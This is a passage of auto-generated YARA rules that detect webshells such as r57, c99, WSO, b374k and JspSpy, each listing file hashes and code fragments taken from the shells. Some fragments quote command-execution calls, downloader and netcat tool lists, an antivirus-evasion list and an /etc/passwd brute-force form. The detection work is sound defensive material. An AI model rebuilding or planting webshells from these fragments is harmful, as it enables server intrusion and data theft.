      $s3 = "\"-MaxNrUsers=-1\"&vbCrLf&\"-IdleTimeOut=600\"&vbCrLf&\"-SessionTimeOut=-1\"&vbCrLf&\"-Expire=0\"&vbCrLf&\"-RatioUp=1\"&vbCrLf&_" ascii
      $s4 = "Set objTmp=Nothing" fullword ascii
      $s5 = "Set adoCatalog=Nothing" fullword ascii
      $s6 = "Set objStream=Nothing" fullword ascii
      $s7 = "With objStream" fullword ascii
      $s8 = "Const isDebugMode=False" fullword ascii
      $s9 = "FileStart= 0" fullword ascii
      $s10 = "vbCrlf=chrB(13)&chrB(10)" fullword ascii
      $s11 = "mt=\"SITE MAINTENANCE\"&vbCrLf" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _good_1_aspmuma_331 {
   meta:
      description = "webshell - from files good_1.asp, aspmuma.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "dc3ad511eae2564b5d3b94f93468b9fae1114f4b70d851177d6938ad99be21b6"
      hash2 = "8054e1a3a6245488b57c2a7ea235ebe2b81a3e73d96e10c1c732223754e5788d"
   strings:
      $s1 = "objstream.Charset = Cset " fullword ascii
      $s2 = "objstream.Mode =3 " fullword ascii
      $s3 = "objstream.Close " fullword ascii
      $s4 = "objstream.Type = 1 " fullword ascii
      $s5 = "objstream.Write body " fullword ascii
      $s6 = "objstream.Position = 0 " fullword ascii
      $s7 = "objstream.Open " fullword ascii
      $s8 = "BytesToBstr = objstream.ReadText " fullword ascii
      $s9 = "objstream.Type = 2 " fullword ascii
      $s10 = "dim objstream " fullword ascii
      $s11 = "set objstream = nothing " fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 70KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell127_EgY_SpIdEr_ShElL_V2_newsh_r57shell_SnIpEr_SA_Shell_r57_Mohajer22_r57_kartal_c99_w4cking_r57_c99_locus7s_r57_iFX_332 {
   meta:
      description = "webshell - from files r57shell127.php, EgY_SpIdEr ShElL V2.php, newsh.php, r57shell.php, SnIpEr_SA Shell.php, r57_Mohajer22.php, r57_kartal.php, c99_w4cking.php, r57.php, c99_locus7s.php, r57_iFX.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash3 = "60a4730f359762d973d9cfc00093cdbddaa2ce4ca4c4e113a57c73e44353d93c"
      hash4 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash5 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
      hash6 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash7 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash8 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
      hash9 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash10 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
      hash11 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
   strings:
      $s1 = "    $res = @shell_exec($cfe);" fullword ascii
      $s2 = "    $res = @ob_get_contents();" fullword ascii
      $s3 = "    @exec($cfe,$res);" fullword ascii
      $s4 = " if (!empty($cfe))" fullword ascii
      $s5 = "    @passthru($cfe);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( all of them )
      ) or ( all of them )
}

rule _angel_v4xGus6X_WSO_4_0_5_spy_2011_2013_wso_333 {
   meta:
      description = "webshell - from files angel.php, v4xGus6X.php, WSO_4_0_5.php, spy.php, 2011.php, 2013.php, wso.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61f8635790fa5873c4fbcf873e9e8ff18ce3ed0a5a68f464401118adac3f969a"
      hash2 = "f81558fca974375a5e6512dece2d3d3a0d854390223511c609ed61a104f9e2fa"
      hash3 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash4 = "e1c70ddcfbc56c7dff46ea03ed53aab3f022e53a6f8e98f12d8b8557cc6bfb4d"
      hash5 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash6 = "106c686e2688535d2ff747203fdec675096fc9287655f833485520ae5e8365bb"
      hash7 = "ef740d974b11cf6c8da3d4e81785236e4f6ba1d5b0b7a89787955963bcba5f6d"
   strings:
      $s1 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" fullword ascii
      $s2 = "$danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','sh" ascii
      $s3 = "ieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','" ascii
      $s4 = "$danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','sh" ascii
      $s5 = "foreach ($userful as $item)" fullword ascii
      $s6 = "ninja');" fullword ascii
      $s7 = "foreach ($danger as $item)" fullword ascii
      $s8 = "if(!$GLOBALS['safe_mode']) {" fullword ascii
      $s9 = "$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl')" ascii
      $s10 = "$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl')" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _angel_2009lite_spy_2011_2013_2009mssql_334 {
   meta:
      description = "webshell - from files angel.php, 2009lite.php, spy.php, 2011.php, 2013.php, 2009mssql.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61f8635790fa5873c4fbcf873e9e8ff18ce3ed0a5a68f464401118adac3f969a"
      hash2 = "61956e7a2fe44293ceaedc2e56ac52eee13064cd328fab1c5b314e5dc56012a6"
      hash3 = "e1c70ddcfbc56c7dff46ea03ed53aab3f022e53a6f8e98f12d8b8557cc6bfb4d"
      hash4 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash5 = "106c686e2688535d2ff747203fdec675096fc9287655f833485520ae5e8365bb"
      hash6 = "77b769be4387a43095812683ce1759814aba6e12792a26e1cf0bb8b4156cd80d"
   strings:
      $s1 = "scookie('loginpass', '', -86400 * 365);" fullword ascii
      $s2 = "GetWDirList($f);" fullword ascii
      $s3 = "while($file = @readdir($dh)) {" fullword ascii
      $s4 = "p('<td nowrap>'.$attachsize.'</td>');" fullword ascii
      $s5 = "goback();" fullword ascii
      $s6 = "function goback(){" fullword ascii
      $s7 = "$attachsize = is_numeric($attachsize) ? sizecount($attachsize) : 'Unknown';" fullword ascii
      $s8 = "$filedata = array();" fullword ascii
      $s9 = "if ($file != '.' && $file != '..') {" fullword ascii /* Goodware String - occured 2 times */
      $s10 = "p('<p><input class=\"bt\" name=\"'.$name.'\" id=\"'.$name.'\" type=\"submit\" value=\"Submit\"></p>');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _shell_icesword_phpspy_2006_lnc_335 {
   meta:
      description = "webshell - from files shell.php, icesword.php, phpspy_2006.php, lnc.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64e6c08aa0b542481b86a91cdf1f50c9e88104a8a4572a8c6bd312a9daeba60e"
      hash2 = "adf16adeffb5b05dda9e3588f06dba46fcd520c33f113ec0090cd4cda82b8b11"
      hash3 = "9269ad2472ecbabbc7b8e838312c71daa42eeadfd79c20f771107e848920c35e"
      hash4 = "28e6e00c1851a30f0f847df7c21f371b41f815150011b1b2d7b8d5ef060a2900"
   strings:
      $s1 = "\",\"<a href=\\\"http://\".$_SERVER['SERVER_NAME'].\"\\\" target=\\\"_blank\\\">\".$_SERVER['SERVER_NAME'].\"</a>\")," fullword ascii
      $s2 = "\",gethostbyname($_SERVER['SERVER_NAME']))," fullword ascii
      $s3 = "\",$_SERVER['SERVER_PORT'])," fullword ascii
      $s4 = "\",$_SERVER['HTTP_ACCEPT_LANGUAGE'])," fullword ascii
      $s5 = "\",PHP_VERSION)," fullword ascii
      $s6 = " upload_max_filesize\",$upsize)," fullword ascii
      $s7 = " h:i:s\",time()))," fullword ascii
      $s8 = "\",strtoupper(php_sapi_name()))," fullword ascii
      $s9 = " disable_functions\",$dis_func)," fullword ascii
      $s10 = "\",PHP_OS)," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( all of them )
      ) or ( all of them )
}

rule _b374k_2_4_1n73ction_b374k_2_2_b374k_2_3_336 {
   meta:
      description = "webshell - from files b374k-2.4.php, 1n73ction.php, b374k-2.2.php, b374k-2.3.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "13102785319ab7591a39c8a8bb40b01bf34e49a7f0a832a1f3dbaabf5f40e9dd"
      hash2 = "8dde4d18d837508fd3c62b2a4f8bf2ea9ddb4d11177331a28642518ffabfe8ed"
      hash3 = "5479f8cd1375364770df36e5a18262480a8f9d311e8eedb2c2390ecb233852ad"
      hash4 = "e6b1fbcc9a2d988ef9e8c36da38f19a802a5886a43736a1466566f97f342f946"
   strings:
      $s1 = "if(!$win && $posix){" fullword ascii
      $s2 = "if($tree > 2) for($i=0;$i<$tree-2;$i++) $parent .= $path[$i].DIRECTORY_SEPARATOR;" fullword ascii
      $s3 = "foreach($dh as $file){" fullword ascii
      $s4 = "$buff = \"" fullword ascii
      $s5 = "$fname = array();" fullword ascii
      $s6 = "$buff .= \"</table>\";" fullword ascii
      $s7 = "sort($fname);" fullword ascii
      $s8 = "sort($dname);" fullword ascii
      $s9 = "$parent = \"\";" fullword ascii
      $s10 = "$dname = array();" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( all of them )
      ) or ( all of them )
}

rule _wso_4_2_4_wso_4_2_3_wso_4_2_1_WSO_4_0_5_wso_4_2_5_wso_4_1_3__v_wso_4_2_2_337 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso-4.2.3.php, wso-4.2.1.php, WSO_4_0_5.php, wso-4.2.5.php, wso-4.1.3.php, .v.php, wso-4.2.2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash3 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash4 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash5 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash6 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash7 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
      hash8 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
   strings:
      $s1 = "$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes(\"\\n$ \".$_POST['p1'].\"\\n\".ex($_POST['p1']),\"\\n\\r\\t\\'\\0\"));" fullword ascii
      $s2 = "  if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {" fullword ascii
      $s3 = "  $userAgents = array(\"Google\", \"Slurp\", \"MSNBot\", \"ia_archiver\", \"Yandex\", \"Rambler\");" fullword ascii
      $s4 = "  header('HTTP/1.0 404 Not Found');" fullword ascii
      $s5 = "<form name='nfp' onSubmit='g(null,null,this.using.value,this.port.value,this.pass.value);return false;'>" fullword ascii
      $s6 = "$_POST['a'] = 'FilesMan';" fullword ascii
      $s7 = "<form name='nfp' onSubmit='g(null,null,this.using.value,this.server.value,this.port.value);return false;'>" fullword ascii
      $s8 = "Server: <input type='text' name='server' value=\". $_SERVER['REMOTE_ADDR'] .\"> Port: <input type='text' name='port' value='3133" ascii
      $s9 = "$menu .= '<th>[ <a href=\"#\" onclick=\"g(\\''.$v.'\\',null,\\'\\',\\'\\',\\'\\')\">'.$k.'</a> ]</th>';" fullword ascii
      $s10 = "}else return \"" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _wso_4_2_4_wso_4_2_5__v_338 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso-4.2.5.php, .v.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash3 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
   strings:
      $s1 = "el><br><span>Server IP:</span><br>'.gethostbyname($_SERVER[\"HTTP_HOST\"]).'<br><span>Client IP:</span><br>'.$_SERVER['REMOTE_AD" ascii
      $s2 = " '<td width=1 align=right><nobr><label><select onchange=\"g(null,null,null,null,null,this.value)\">'.$opt_charsets.'</select></l" ascii
      $s3 = "<td><input type=text name=sql_pass value=\\\"\". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) .\"\\\" req" ascii
      $s4 = "<td><input type=text name=sql_pass value=\\\"\". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) .\"\\\" req" ascii
      $s5 = "if(!empty($_COOKIE['act']) && @count($_COOKIE['f']))" fullword ascii
      $s6 = "echo \"<option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>\";" fullword ascii
      $s7 = "<label><select name='p1'>\";" fullword ascii
      $s8 = " '<td width=1 align=right><nobr><label><select onchange=\"g(null,null,null,null,null,this.value)\">'.$opt_charsets.'</select></l" ascii
      $s9 = "'].'</nobr></td></tr></table>'." fullword ascii
      $s10 = "</td><td>\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _1n73ction_v4xGus6X_itsec_339 {
   meta:
      description = "webshell - from files 1n73ction.php, v4xGus6X.php, itsec.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8dde4d18d837508fd3c62b2a4f8bf2ea9ddb4d11177331a28642518ffabfe8ed"
      hash2 = "f81558fca974375a5e6512dece2d3d3a0d854390223511c609ed61a104f9e2fa"
      hash3 = "f7689792bc8b2a012d41d584fdb21a1af778571c3f4419ca5598b17a370283c7"
   strings:
      $s1 = "$file=\"Dump-$dbname-$date.sql\";" fullword ascii
      $s2 = "header(\"Content-Length: \" . filesize($file));" fullword ascii
      $s3 = "$file = \"Dump-$dbname-$date\";" fullword ascii
      $s4 = "header(\"Content-Disposition: attachment; filename=\" . $file);   " fullword ascii
      $s5 = "mysql_connect ($dbserver, $dbuser, $dbpass);" fullword ascii
      $s6 = "fwrite($fp,$data);" fullword ascii
      $s7 = "global $fp;" fullword ascii
      $s8 = "$fp = fopen($file, \"r\");" fullword ascii
      $s9 = "$tables = mysql_query (\"SHOW TABLES\");" fullword ascii
      $s10 = "$date = date(\"Y-m-d\");" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( all of them )
      ) or ( all of them )
}

rule _r57shell_r57_340 {
   meta:
      description = "webshell - from files r57shell.php, r57.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash2 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
   strings:
      $s1 = "// ????? ? ?????? ??? ??????? ? ??????? (Login & Password for access)" fullword ascii
      $s2 = "// $auth = 1; - ?????????????? ????????  ( authentification = On  )" fullword ascii
      $s3 = "// $auth = 0; - ?????????????? ????????? ( authentification = Off )" fullword ascii
      $s4 = "$text['ru']  = array('?? ??????? ???????????? ? ftp ???????','?????? ??????????? ?? ftp ???????','?? ??????? ???????? ??????????" ascii
      $s5 = "// ?? ???????? ??????? ????? ??????????? ?? ???????!!! (CHANGE THIS!!!)" fullword ascii
      $s6 = "$text['ru']  = array('?? ??????? ???????????? ? ftp ???????','?????? ??????????? ?? ftp ???????','?? ??????? ???????? ??????????" ascii
      $s7 = "/* ~~~ ????????? | Options  ~~~ */" fullword ascii
      $s8 = " ?? ftp ???????');" fullword ascii
      $s9 = "// ????? ????? | Language" fullword ascii
      $s10 = "$text['ru']  = array('?? ??????? ????????? ??????','?????? ??????????');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _wso2_5_1_other_decode_wso_4_2_1_wso2_WSO_4_0_5_wso_4_1_3_wso_4_2_2_wso_341 {
   meta:
      description = "webshell - from files wso2.5.1.php, other-decode.php, wso-4.2.1.php, wso2.php, WSO_4_0_5.php, wso-4.1.3.php, wso-4.2.2.php, wso.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash2 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash3 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash4 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash5 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash6 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash7 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
      hash8 = "ef740d974b11cf6c8da3d4e81785236e4f6ba1d5b0b7a89787955963bcba5f6d"
   strings:
      $s1 = ".'<tr><td></td><td><label style=\"padding-left:15px\"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol" ascii
      $s2 = ".'<tr><td></td><td><label style=\"padding-left:15px\"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol" ascii
      $s3 = ".'<td><label><input type=radio name=type value=\"1\" checked> /etc/passwd</label></td></tr>'" fullword ascii
      $s4 = ".'<td><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option>" ascii
      $s5 = ".'<td><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option>" ascii
      $s6 = "</select></td></tr><tr><td>'" fullword ascii
      $s7 = ".'<tr><td></td><td><label><input type=radio name=type value=\"2\"> Dictionary</label></td></tr>'" fullword ascii
      $s8 = "ll,this.selectTool.value,this.input.value);} return false;'><select name='selectTool'>\";" fullword ascii
      $s9 = "echo \"<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,n" ascii
      $s10 = "/label></td></tr>'" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _devilzShell_devilzShell_342 {
   meta:
      description = "webshell - from files devilzShell.aspx, devilzShell.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "73c99b46c973b605d3a9d7b288ffc70c6a62cbf620ccd99b0c44876c77f8bd6e"
      hash2 = "ff753fda2b86325ce018a56429a6e324eb7a05e2893eeee240b9e73708277817"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                ' */
      $s2 = "AAAAAAAAAAAAAABAAAD" ascii /* base64 encoded string '           @  ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF" ascii /* base64 encoded string '                                                 ' */
      $s4 = "EAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s5 = "EAAAAAAAAA" ascii
      $s6 = "var pola = 'example: (using netcat) press &quot;Listen&quot; and then run &quot;nc \" & xServerIP & \" __PORT__&quot;';" fullword ascii
      $s7 = "'################# RESOURCES GOES HERE #######################=============================================]" fullword ascii
      $s8 = "'################# VARIABLES GOES HERE #######################=============================================]" fullword ascii
      $s9 = "iswriteable = \"w\"" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _icesword_job_ha_JspWebshell_1_2_520_ma1_343 {
   meta:
      description = "webshell - from files icesword.jsp, job.jsp, ha.jsp, JspWebshell 1.2.jsp, 520.jsp, ma1.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ea0d67b44f2a604603176606bd47cb55845bf29b191564958ce9b9d2a33c63b9"
      hash2 = "3b2498fbdba4ba0afa07db58bc7635bd32e6c89a5ce71a1e39941099b2d24247"
      hash3 = "d29b790d8d6ec12f98f2bdaadd51232406e2a63885cc5ed302d105ff0361a0c3"
      hash4 = "447696b43af95310a23b953a8822b97a1bdd30f6b8164c890d82763cf022a966"
      hash5 = "5473f1edd8d2c8c37648cf0c64d805741f1cd867eeceb21850570d74851f0d78"
      hash6 = "b5886ba695f39bf801e5b47067cfcf983c645ccfcee6eee5292e7b911601f744"
   strings:
      $s1 = ".inputLogin {font-size: 9pt;border:1px solid lightgrey;background-color: lightgrey;}" fullword ascii
      $s2 = "BACKGROUND-COLOR:lightgrey; height:18px;}" fullword ascii
      $s3 = ".table1 {BORDER:gray 0px ridge;}" fullword ascii
      $s4 = ".td2 {BORDER-RIGHT:#ffffff 0px solid;BORDER-TOP:#ffffff 1px solid;BORDER-LEFT:#ffffff 1px solid;BORDER-BOTTOM:#ffffff 0px solid;" ascii
      $s5 = ".tr1 {BACKGROUND-color:gray }" fullword ascii
      $s6 = "  </TABLE>" fullword ascii
      $s7 = "  <TABLE class=\"table1\" cellSpacing=\"1\" cellPadding=\"1\" width=\"473\" border=\"0\" align=\"center\">" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _c5_403_queryDong_myxx1_config_000_t00ls1_zend_t00ls_spyjsp2010_hideShell_344 {
   meta:
      description = "webshell - from files c5.jsp, 403.jsp, queryDong.jsp, myxx1.jsp, config.jsp, 000.jsp, t00ls1.jsp, zend.jsp, t00ls.jsp, spyjsp2010.jsp, hideShell.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64fbd3a67c6d02626cf130946a3bc5e8113a65ea66176006582a380b12d495d9"
      hash2 = "9e510dffd01cef28047043c0331f408279042cf724c8d2a76968e5eb40446caa"
      hash3 = "9b3677edc3dc6cf868b8c62166ed9db5062891501b3776876ea95a7e8884db72"
      hash4 = "a5b67b8b8617fd8f2cff76399aa8782813bb29f06c9b6b444db8617a65a0771c"
      hash5 = "5deda28b47b16d083c40e0fecdf617de7e645a7b06a053a572c6e2702dc8577b"
      hash6 = "2424ea073fb98b85c26b9fd47bc8cfe5008504fd7ab80de428b75c296f3dd114"
      hash7 = "9347f147b944e67d33818aa1a5fa10476ef333acb838e80fffb2db2da71c9368"
      hash8 = "e26e617b9e9b77f4578f8737e3463c18210855626b4aca49d465be65f59e97d1"
      hash9 = "bb809d10d8dc0be89123e35d659513fb49faed3aea32c1facfcc9d21ad39f422"
      hash10 = "410bf542ec9d693517486e33e7f45955d2a06f77f195e847c74ac3dcacf6a677"
      hash11 = "95e97a480447aa0ab0e679af117178e56490d9fb7b4b9ec0ed26efbeede56eb3"
   strings:
      $s1 = "private OutputStream targetOutput = null;" fullword ascii
      $s2 = "this.targetOutput = stream;" fullword ascii
      $s3 = "public void setTargetOutput(OutputStream stream) {" fullword ascii
      $s4 = "upload.parseRequest(request);" fullword ascii
      $s5 = "stream.close();" fullword ascii
      $s6 = "return this.fileName;" fullword ascii
      $s7 = "f.setAccessible(true);" fullword ascii
      $s8 = "throw ioe;" fullword ascii
      $s9 = "if (cls != null) {" fullword ascii
      $s10 = "Class cls = null;" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _c5_m_he1p_1_nogfw_JspSpy1_403_luci_jsp_spy2009_queryDong_a_JspSpyJDK5_JspSpyJDK51_u_000_t00ls1_css_807_jspspy_k8_jspspy_t00_345 {
   meta:
      description = "webshell - from files c5.jsp, m.jsp, he1p.jsp, 1.jsp, nogfw.jsp, JspSpy1.jsp, 403.jsp, luci.jsp.spy2009.jsp, queryDong.jsp, a.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, u.jsp, 000.jsp, t00ls1.jsp, css.jsp, 807.jsp, jspspy_k8.jsp, jspspy.jsp, t00ls.jsp, ma3.jsp, spyjsp2010.jsp, ok.jsp, style.jsp, SJavaWebManageV1.4.jsp, cofigrue.jsp, dm.jsp, xia.jsp, x7.jsp, mmym520.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64fbd3a67c6d02626cf130946a3bc5e8113a65ea66176006582a380b12d495d9"
      hash2 = "57764b5504b584b7cd7969b17d2401a6fe85f1f3a03d02943bc0bdc74514a7c3"
      hash3 = "4aa34b6d453b0f2f723d699553533b70accad316d69308987de458664ed8dd79"
      hash4 = "11394a4bf56a01a0c77f3657abc4c90d134fb8579965aa3acb889cf43fb047c1"
      hash5 = "89a1dccb42fea5cb434392324f8729127399f344fba831e60f004a063b05c265"
      hash6 = "bf5e7cbcb5e1651762302f279b749281d834834cce2d5a5af7319e794690ac2e"
      hash7 = "9e510dffd01cef28047043c0331f408279042cf724c8d2a76968e5eb40446caa"
      hash8 = "148f88c0b115cf2e7d5a362863feef97b5c513c1f0925780009489ce5245e1f9"
      hash9 = "9b3677edc3dc6cf868b8c62166ed9db5062891501b3776876ea95a7e8884db72"
      hash10 = "4ab552f0503e859e7c96850908ca05525f2ea55f6e9058f7750b36f246b7170d"
      hash11 = "3b4283db4961a557b02b3de8377b61f5c085552a46191625db42939056129d53"
      hash12 = "8047492f47b2ad546190ad1dd18984916da0ac0b046dca46e1f5af315781d182"
      hash13 = "a063d05eac21c1a6eb046c90f770b5f769890034b9daf7dfda58fc749c330b2b"
      hash14 = "2424ea073fb98b85c26b9fd47bc8cfe5008504fd7ab80de428b75c296f3dd114"
      hash15 = "9347f147b944e67d33818aa1a5fa10476ef333acb838e80fffb2db2da71c9368"
      hash16 = "7aa89ae3f2118e6c5eeefab268f4dca602b082edb3c571bdc38b2bc8301a438a"
      hash17 = "b996b499c5f56b51eccc5fa181bc69b208da8023c441277a522aa52ace72ecbd"
      hash18 = "9ce81cfc056822ec9962aa8d6ca2233ac56e26a10f96cddc117d89b73a14c060"
      hash19 = "09662e5f79e84781ecb6b508794e52a578726229cc2e37be676cfba5e8751d1a"
      hash20 = "bb809d10d8dc0be89123e35d659513fb49faed3aea32c1facfcc9d21ad39f422"
      hash21 = "bb337a76a63131dc29572bd11d2d3104824d08dc06acfbd8cf6059824d1aa104"
      hash22 = "410bf542ec9d693517486e33e7f45955d2a06f77f195e847c74ac3dcacf6a677"
      hash23 = "debf6d0c7f01efd7bdc4322591bf5d0fdbcc299a2093827ac05873276230d336"
      hash24 = "781a141485d7dbf902a5ff10c873653e52622373048e38916a2d7bf5af216074"
      hash25 = "ecf43efae44a4fb4078bc7da76e07cc10fe4e92fc145b58d7999f0cc2b902cde"
      hash26 = "444cb5e82638a872b85d18ecb67b71649f2a3f543bc2874397fa63d889571ce0"
      hash27 = "75c94d0f6f29908dc10227de1eb45de9afa871891c18942ebd33dd916203b43e"
      hash28 = "d77fd709d2bf2a8b25277ebebda1a3522a563eb3a95a240cf2640ab9e7deed58"
      hash29 = "30e33036efcafcca023954308dfb75b7b3a48c4b9d3cdf776943f6479f559235"
      hash30 = "1cd6b614fd667f72bf9b6676522b3e6fac7056c4232f1dcaefff55e98655b1bf"
   strings:
      $s1 = "this.conn = DriverManager.getConnection(url,uid,pwd);" fullword ascii
      $s2 = "public void closeStmt() throws Exception{" fullword ascii
      $s3 = "this(driver,url,uid,pwd,false);" fullword ascii
      $s4 = "SimpleDateFormat format = new SimpleDateFormat(\"yyyy-MM-dd hh:mm:ss\");" fullword ascii
      $s5 = "public void connect() throws Exception{" fullword ascii
      $s6 = "for (int i=1;i<=colCount;i++) {" fullword ascii
      $s7 = "for (int i = 1;i<=colCount;i++) {" fullword ascii
